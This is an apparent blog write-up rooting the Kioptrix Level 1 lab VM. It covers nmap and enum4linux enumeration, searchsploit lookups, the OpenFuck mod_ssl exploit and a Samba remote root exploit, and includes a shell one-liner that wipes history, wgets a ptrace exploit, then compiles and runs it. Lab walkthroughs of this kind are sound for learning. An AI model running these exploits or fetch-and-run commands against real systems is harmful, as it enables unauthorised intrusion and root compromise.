<i>Kioptrix 1 VM can be downloaded <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">here</a>.</i><br /><br />Kioptrix series consists of 5 vulnerable machines, every one is slightly harder than the one before. It will give you the chance to identify vulnerable services, use public exploits, and get the feeling of how proper pen testing is done. This machine can be rooted via a few different ways which will be discussed below, yet I will be also listing which attempts failed.<br /><br /><h2 style="text-align: left;">0. Get VM's IP</h2><!-- HTML generated using hilite.me --><br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> netdiscover -r 192.168.1.0/24<br /><br /><span style="color: #888888;">Currently scanning: Finished!   |   Screen View: Unique Hosts                                                  </span><br /><span style="color: #888888;">                                                                                                                </span><br /><span style="color: #888888;"> 260 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 15600                                            </span><br /><span style="color: #888888;"> _____________________________________________________________________________</span><br /><span style="color: #888888;">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br /><span style="color: #888888;"> -----------------------------------------------------------------------------</span><br /><span style="color: #888888;">...                                </span><br /><span style="color: #888888;"> <span style="color: black;"><b>192.168.1.104</b></span>   c4:e9:84:10:d3:5e      2     120  TP-LINK TECHNOLOGIES CO.,LTD.                                </span><br /><span style="color: #888888;">...</span><br /></pre></div><div style="text-align: left;"><br /><h2>1. Enumeration</h2></div><div style="text-align: left;"></div><div style="text-align: left;"><h4>1.1 Enumerate services&nbsp;</h4><h4>&nbsp;</h4><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> nmap -T4 192.168.1.104 -sV -O<br /><br /><span style="color: #888888;">Starting Nmap 7.31 ( https://nmap.org ) at 2016-11-11 23:22 EST</span><br /><span style="color: #888888;">Nmap scan report for 192.168.1.104</span><br /><span style="color: #888888;">Host is up (0.00013s latency).</span><br /><span style="color: #888888;">Not shown: 994 closed ports</span><br /><span style="color: #888888;">PORT     STATE SERVICE     VERSION</span><br /><b><span style="color: #888888;">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br /><span style="color: #888888;">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br /><span style="color: #888888;">111/tcp  open  rpcbind     2 (RPC #100000)</span><br /><span style="color: #888888;">139/tcp  open  netbios-ssn Samba smbd (workgroup: vMYGROUP)</span><br /><span style="color: #888888;">443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br /><span style="color: #888888;">1024/tcp open  status      1 (RPC #100024)</span></b><br /><span style="color: #888888;">MAC Address: C4:E9:84:10:D3:5E (Tp-link Technologies)</span><br /><span style="color: #888888;">Device type: general purpose</span><br /><span style="color: #888888;">Running: Linux 2.4.X</span><br /><span style="color: #888888;">OS CPE: cpe:/o:linux:linux_kernel:2.4</span><br /><span style="color: #888888;">OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</span><br /><span style="color: #888888;">Network Distance: 1 hop</span><br /><br /><span style="color: #888888;">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br /><span style="color: #888888;">Nmap done: 1 IP address (1 host up) scanned in 18.46 seconds</span><br /></pre></div><br />That's a lot of outdated services! Let's go over each and find how we can exploit them. Some resources for identifying vulnerabilities and/or finding exploits for known services:<br /><ul><li><a href="http://www.securityfocus.com/">Security Focus</a> </li><li><a href="http://exploit-db.com/">Exploit DB</a></li><li><a href="https://www.exploit-db.com/searchsploit/">Searchsploit </a>(local exploit DB) </li></ul><h4>1.2 Enum4Linux&nbsp;</h4><!-- HTML generated using hilite.me --><br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> enum4linux 192.168.1.104<br /><span style="color: #888888;">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 11 23:32:17 2016</span><br /><span style="color: #888888;">...</span><br /><br /><span style="color: #888888;"> ======================================= </span><br /><span style="color: #888888;">|    OS information on 192.168.1.104    |</span><br /><span style="color: #888888;"> ======================================= </span><br /><span style="color: #888888;">[+] Got OS info for 192.168.1.104 from smbclient: Domain=[MYGROUP] OS=[Unix] <span style="color: black;"><b>Server=[Samba 2.2.1a]</b></span></span><br /><span style="color: #888888;">[+] Got OS info for 192.168.1.104 from srvinfo:</span><br /><span style="color: #888888;"> KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server</span><br /><span style="color: #888888;"> platform_id     : 500</span><br /><span style="color: #888888;"> os version      : 4.5</span><br /><span style="color: #888888;"> server type     : 0x9a03</span><br /><br /><span style="color: #888888;">...</span><br /><span style="color: #888888;"> </span><br /><span style="color: #888888;"> ========================================== </span><br /><span style="color: #888888;">|    Share Enumeration on 192.168.1.104    |</span><br /><span style="color: #888888;"> ========================================== </span><br /><span style="color: #888888;">WARNING: The "syslog" option is deprecated</span><br /><span style="color: #888888;">Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]</span><br /><span style="color: #888888;">Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]</span><br /><br /><span style="color: #888888;"> Sharename       Type      Comment</span><br /><span style="color: #888888;"> ---------       ----      -------</span><br /><span style="color: #888888;"> IPC$            IPC       IPC Service (Samba Server)</span><br /><span style="color: #888888;"> ADMIN$          IPC       IPC Service (Samba Server)</span><br /><br /><span style="color: #888888;"> Server               Comment</span><br /><span style="color: #888888;"> ---------            -------</span><br /><span style="color: #888888;"> KIOPTRIX             Samba Server</span><br /><br /><span style="color: #888888;"> Workgroup            Master</span><br /><span style="color: #888888;"> ---------            -------</span><br /><span style="color: #888888;"> MYGROUP              KIOPTRIX</span><br /><span style="color: #888888;"> WORKGROUP            ELSAFFA7</span><br /><br /><span style="color: #888888;">[+] Attempting to map shares on 192.168.1.104</span><br /><span style="color: #888888;">//192.168.1.104/IPC$ [E] Can't understand response:</span><br /><span style="color: #888888;">WARNING: The "syslog" option is deprecated</span><br /><span style="color: #888888;">Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]</span><br /><span style="color: #888888;">NT_STATUS_NETWORK_ACCESS_DENIED listing \*</span><br /><span style="color: #888888;">//192.168.1.104/ADMIN$ [E] Can't understand response:</span><br /><span style="color: #888888;">WARNING: The "syslog" option is deprecated</span><br /><span style="color: #888888;">Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]</span><br /><span style="color: #888888;">tree connect failed: NT_STATUS_WRONG_PASSWORD</span><br /><br /><span style="color: #888888;">...</span><br /><br /><span style="color: #888888;">enum4linux complete on Fri Nov 11 23:32:28 2016</span><br /><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> </pre></div><pre style="line-height: 125%; margin: 0;">&nbsp;</pre>enum4linux was able to identify which Samba service was running (2.2.1a), this will help us later! <br /><h2></h2><h2>2. Exploiting OpenSSH (?)</h2><h4>Using existing vulnerabilities</h4><!-- HTML generated using hilite.me --><br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> searchsploit openssh <br /><span style="color: #888888;">---------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------</span><br /><span style="color: #888888;"> Exploit Title                                                                                                                                      |  Path</span><br /><span style="color: #888888;">                                                                                                                                                    | (/usr/share/exploitdb/platforms)</span><br /><span style="color: #888888;">---------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------</span><br /><span style="color: #888888;">OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                                                                                                   | ./linux/remote/25.c</span><br /><span style="color: #888888;">OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                                                                                                 | ./linux/remote/26.sh</span><br /><span style="color: #888888;">glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - Exploits                                                                                               | ./linux/local/258.sh</span><br /><span style="color: #888888;">Dropbear / OpenSSH Server - (MAX_UNAUTH_CLIENTS) Denial of Service                                                                                  | ./multiple/dos/1572.pl</span><br /><span style="color: #888888;">OpenSSH 4.3 p1 - (Duplicated Block) Remote Denial of Service                                                                                        | ./multiple/dos/2444.sh</span><br /><span style="color: #888888;">Portable OpenSSH 3.6.1p-PAM / 4.1-SuSE - Timing Attack Exploit                                                                                      | ./multiple/remote/3303.sh</span><br /><span style="color: #888888;">Debian OpenSSH - Authenticated Remote SELinux Privilege Elevation Exploit                                                                           | ./linux/remote/6094.txt</span><br /><span style="color: #888888;">Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                                                                                  | ./novell/dos/14866.txt</span><br /><span style="color: #888888;">FreeBSD OpenSSH 3.5p1 - Remote Root Exploit                                                                                                         | ./freebsd/remote/17462.txt</span><br /><span style="color: #888888;">OpenSSH 1.2 - '.scp' File Create/Overwrite                                                                                                          | ./linux/remote/20253.sh</span><br /><b><span style="color: #888888;">OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One                                                                                                   | ./unix/remote/21314.txt</span></b><br /><span style="color: #888888;">OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow                                                                                          | ./linux/remote/21402.txt</span><br /><span style="color: #888888;">OpenSSH 3.x - Challenge-Response Buffer Overflow (1)                                                                                                | ./unix/remote/21578.txt</span><br /><span style="color: #888888;">OpenSSH 3.x - Challenge-Response Buffer Overflow (2)                                                                                                | ./unix/remote/21579.txt</span><br /><span style="color: #888888;">OpenSSH 7.2p1 - Authenticated xauth Command Injection                                                                                               | ./multiple/remote/39569.py</span><br /><span style="color: #888888;">OpenSSHd 7.2p2 - Username Enumeration (1)                                                                                                           | ./linux/remote/40113.txt</span><br /><span style="color: #888888;">OpenSSHd 7.2p2 - Username Enumeration (2)                                                                                                           | ./linux/remote/40136.py</span><br /><span style="color: #888888;">---------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------</span><br /></pre></div><br />Although exploit-db revealed a few exploits, almost all of them are not what we seek. Some of them are targeting different versions, others are local exploits (for a limited shell maybe?). One particularly interesting is <a href="https://www.exploit-db.com/exploits/21314/">this</a> one.<br /><br />After spending some time compiling old openssh version and trying out the exploit, it failed to work as the victim didn't have the specific misconfiguration targeted.<br /><br /><h2>3. Exploiting Apache (and getting root!)</h2>Searching for apache exploits revealed too many results, but searching for the specific version revealed some <a href="https://www.exploit-db.com/exploits/764/">juicy data</a>. <br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> searchsploit apache mod_ssl<br /><span style="color: #888888;">---------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------</span><br /><span style="color: #888888;"> Exploit Title                                                                                                                                      |  Path</span><br /><span style="color: #888888;">                                                                                                                                                    | (/usr/share/exploitdb/platforms)</span><br /><span style="color: #888888;">---------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------</span><br /><span style="color: #888888;">Apache mod_ssl (&lt; 2.8.7) OpenSSL - 'OpenFuckV2.c' Remote Exploit (2)                                                                                | ./unix/remote/764.c</span><br /><span style="color: #888888;">Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                                                          | ./multiple/dos/21575.txt</span><br /><span style="color: #888888;">Apache mod_ssl (&lt; 2.8.7) OpenSSL - 'OpenFuck.c' Remote Exploit (1)                                                                                  | ./unix/remote/21671.c</span><br /><span style="color: #888888;">Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow Exploit                                                | ./unix/remote/40347.txt</span><br /><span style="color: #888888;">Apache mod_ssl 2.0.x - Remote Denial of Service                                                                                                     | ./linux/dos/24590.txt</span><br /><span style="color: #888888;">---------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> <br /></pre></div><br />It both matches Apache's version (1.3.20) and mod_ssl's (2.8.4).<br /><br /><span style="font-family: inherit;">To compile it you'll both need to download <b>libssl-dev</b> and <a href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">update the script.</a></span><br /><br /><span style="font-family: inherit;">Running it without any arguments shows u<span style="font-family: inherit;">s a long list of valid OS-Apache version combinations. The closes<span style="font-family: inherit;">t one <span style="font-family: inherit;">to our system are the following:</span></span></span></span><br /><ul><li><span style="font-family: inherit;"><span style="font-family: inherit;"><span style="font-family: inherit;"><span style="font-family: inherit;"><span style="font-family: inherit;">0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1</span></span></span></span></span></li><li><span style="font-family: inherit;"><span style="font-family: inherit;"><span style="font-family: inherit;"><span style="font-family: inherit;"><span style="font-family: inherit;">0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2</span>&nbsp;</span></span></span> </span></li></ul><!-- HTML generated using hilite.me --><br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> ./a.out 0x6a 192.168.1.104 -c 50<br /><br /><span style="color: #888888;">*******************************************************************</span><br /><span style="color: #888888;">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br /><span style="color: #888888;">*******************************************************************</span><br /><span style="color: #888888;">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br /><span style="color: #888888;">* #hackarena  irc.brasnet.org                                     *</span><br /><span style="color: #888888;">* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br /><span style="color: #888888;">* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br /><span style="color: #888888;">* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br /><span style="color: #888888;">*******************************************************************</span><br /><br /><span style="color: #888888;">Connection... 50 of 50</span><br /><span style="color: #888888;">Establishing SSL connection</span><br /><span style="color: #888888;">cipher: 0x4043808c   ciphers: 0x80f81e8</span><br /><span style="color: #888888;">Ready to send shellcode</span><br /><span style="color: #888888;">Spawning shell...</span><br /><span style="color: #888888;">Good Bye!</span><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> ./a.out 0x6b 192.168.1.104 -c 50<br /><br /><span style="color: #888888;">*******************************************************************</span><br /><span style="color: #888888;">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br /><span style="color: #888888;">*******************************************************************</span><br /><span style="color: #888888;">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br /><span style="color: #888888;">* #hackarena  irc.brasnet.org                                     *</span><br /><span style="color: #888888;">* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br /><span style="color: #888888;">* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br /><span style="color: #888888;">* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br /><span style="color: #888888;">*******************************************************************</span><br /><br /><span style="color: #888888;">Connection... 50 of 50</span><br /><span style="color: #888888;">Establishing SSL connection</span><br /><span style="color: #888888;">cipher: 0x4043808c   ciphers: 0x80f81e8</span><br /><span style="color: #888888;">Ready to send shellcode</span><br /><span style="color: #888888;">Spawning shell...</span><br /><span style="color: #888888;">bash: no job control in this shell</span><br /><span style="color: #888888;">bash-2.05$ </span><br /><span style="color: #888888;">bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; </span><br /><span style="color: #888888;">--01:03:53--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br /><span style="color: #888888;">           =&gt; `ptrace-kmod.c'</span><br /><span style="color: #888888;">Connecting to dl.packetstormsecurity.net:80... connected!</span><br /><span style="color: #888888;">HTTP request sent, awaiting response... 301 Moved Permanently</span><br /><span style="color: #888888;">Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]</span><br /><span style="color: #888888;">--01:03:53--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br /><span style="color: #888888;">           =&gt; `ptrace-kmod.c'</span><br /><span style="color: #888888;">Connecting to dl.packetstormsecurity.net:443... connected!</span><br /><span style="color: #888888;">HTTP request sent, awaiting response... 200 OK</span><br /><span style="color: #888888;">Length: 3,921 [text/x-csrc]</span><br /><br /><span style="color: #888888;">    0K ...                                                   100% @ 957.28 KB/s</span><br /><br /><span style="color: #888888;">01:03:54 (957.28 KB/s) - `ptrace-kmod.c' saved [3921/3921]</span><br /><br /><span style="color: #888888;">[+] Attached to 6225</span><br /><span style="color: #888888;">[+] Signal caught</span><br /><span style="color: #888888;">[+] Shellcode placed at 0x4001189d</span><br /><span style="color: #888888;">[+] Now wait for suid shell...</span><br /><span style="color: #888888;">whoami</span><br /><span style="color: #888888;">root</span><br /></pre></div><br />Shell with root access directly? I almost wet myself. Let's check out other ways.<br /><h2>4. Exploiting Samba (and getting root too!) </h2>A quick search for Samba 2.2.1 exploits reveals a couple of interesting exploits on exploit-db.<br /><ul><li><a href="https://www.exploit-db.com/exploits/10/">Samba 2.2.8 - Remote Root Exploit</a></li><li><a href="http://downloads.securityfocus.com/vulnerabilities/exploits/0x333hate.c">0x333hate.c </a></li></ul>Both work, there's a handful more PoC for this exploit and an MSF module too, I'll only demonstrate the first exploit.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> wget https://www.exploit-db.com/download/10<br /><span style="color: #888888;">--2016-11-12 00:16:51--  https://www.exploit-db.com/download/10</span><br /><span style="color: #888888;">Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8</span><br /><span style="color: #888888;">Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.</span><br /><span style="color: #888888;">HTTP request sent, awaiting response... 200 OK</span><br /><span style="color: #888888;">Length: unspecified [application/txt]</span><br /><span style="color: #888888;">Saving to: ‘10’</span><br /><br /><span style="color: #888888;">10                            [ &lt;=&gt;                                 ]  44.06K  --.-KB/s    in 0.1s    </span><br /><br /><span style="color: #888888;">2016-11-12 00:16:59 (364 KB/s) - ‘10’ saved [45117]</span><br /><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> mv 10 b.c<br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> gcc b.c<br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> ./a.out <br /><span style="color: #888888;">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</span><br /><span style="color: #888888;">--------------------------------------------------------------</span><br /><span style="color: #888888;">Usage: ./a.out [-bBcCdfprsStv] [host]</span><br /><br /><span style="color: #888888;">-b &lt;platform&gt;   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)</span><br /><span style="color: #888888;">-B &lt;step&gt;       bruteforce steps (default = 300)</span><br /><span style="color: #888888;">-c &lt;ip address&gt; connectback ip address</span><br /><span style="color: #888888;">-C &lt;max childs&gt; max childs for scan/bruteforce mode (default = 40)</span><br /><span style="color: #888888;">-d &lt;delay&gt;      bruteforce/scanmode delay in micro seconds (default = 100000)</span><br /><span style="color: #888888;">-f              force</span><br /><span style="color: #888888;">-p &lt;port&gt;       port to attack (default = 139)</span><br /><span style="color: #888888;">-r &lt;ret&gt;        return address</span><br /><span style="color: #888888;">-s              scan mode (random)</span><br /><span style="color: #888888;">-S &lt;network&gt;    scan mode</span><br /><span style="color: #888888;">-t &lt;type&gt;       presets (0 for a list)</span><br /><span style="color: #888888;">-v              verbose mode</span><br /><br /><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> ./a.out -b 0 -c 192.168.1.71 -C 40 192.168.1.104<br /><span style="color: #888888;">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</span><br /><span style="color: #888888;">--------------------------------------------------------------</span><br /><span style="color: #888888;">+ Bruteforce mode. (Linux)</span><br /><span style="color: #888888;">+ Host is running samba.</span><br /><span style="color: #888888;">+ Worked!</span><br /><span style="color: #888888;">--------------------------------------------------------------</span><br /><span style="color: #888888;">*** JE MOET JE MUIL HOUWE</span><br /><span style="color: #888888;">Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</span><br /><span style="color: #888888;">uid=0(root) gid=0(root) groups=99(nobody)</span><br /></pre></div><br /><br />Oh, and here's our flag:<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">cat /var/mail/root<br />From root  Sat Sep 26 11:42:10 2009<br />Return-Path: &lt;root@kioptix.level1&gt;<br />Received: (from root@localhost)<br /> by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831<br /> for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400<br />Date: Sat, 26 Sep 2009 11:42:10 -0400<br />From: root &lt;root@kioptix.level1&gt;<br />Message-Id: &lt;200909261542.n8QFgAZ01831@kioptix.level1&gt;<br />To: root@kioptix.level1<br />Subject: About Level 2<br />Status: O<br /><br />If you are reading this, you got root. Congratulations.<br />Level 2 won't be as easy...<br /><br />From root  Sat Nov 12 00:04:37 2016<br />Return-Path: &lt;root@kioptrix.level1&gt;<br />Received: (from root@localhost)<br /> by kioptrix.level1 (8.11.6/8.11.6) id uAC54bQ01088<br /> for root; Sat, 12 Nov 2016 00:04:37 -0500<br />Date: Sat, 12 Nov 2016 00:04:37 -0500<br />From: root &lt;root@kioptrix.level1&gt;<br />Message-Id: &lt;201611120504.uAC54bQ01088@kioptrix.level1&gt;<br />To: root@kioptrix.level1<br />Subject: LogWatch for kioptrix.level1<br /><br /><br /><br /> ################## LogWatch 2.1.1 Begin ##################### <br /><br /><br /> ---------------- Connections (secure-log) Begin ------------------- <br /><br />**Unmatched Entries**<br />Nov 11 23:59:32 kioptrix sshd[745]: Server listening on 0.0.0.0 port 22.<br /><br /><br /> ----------------- Connections (secure-log) End -------------------- <br /><br /><br /><br /> --------------------- SSHD Begin ------------------------ <br /><br />**Unmatched Entries**<br />Starting sshd:<br /> succeeded<br /><br /><br /><br /> ---------------------- SSHD End ------------------------- <br /><br /><br /><br /> ###################### LogWatch End ######################### <br /></pre></div><br />That was a short one, time to write up <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">Kioptrix 2</a>.<br /><br /><i>Currently listening to <a href="https://www.youtube.com/watch?v=ODHhWcEdrvg">Metallica - My Friend of Misery</a></i></div>